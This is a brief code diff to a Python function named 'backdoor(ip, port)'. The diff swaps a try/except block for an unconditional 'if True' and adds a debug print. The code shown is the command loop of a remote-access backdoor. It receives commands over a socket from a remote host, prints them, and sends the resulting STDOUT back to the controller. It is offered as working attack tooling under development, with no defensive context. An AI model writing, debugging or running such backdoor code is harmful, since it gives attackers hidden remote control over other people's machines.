@@ -21,7 +21,9 @@ def backdoor(ip, port):
   client.send(header.encode())
 
   while True:
-    try:
+    print("in while")
+    #try:
+    if True:
       cmd = client.recv(1024).decode("utf-8")
       print(f"Received: {cmd}")
       if not cmd:
@@ -39,9 +41,9 @@ def backdoor(ip, port):
       else:
         print(f"STDOUT: {STDOUT}")
         client.send(STDOUT)
-    except Exception as e:
-      print(f"ERROR: {e}")
-      client.send("Error: {}".format(str(e)).encode())
+    #except Exception as e:
+    #  print(f"ERROR: {e}")
+    #  client.send("Error: {}".format(str(e)).encode())
   client.close()
   sock.close()
 
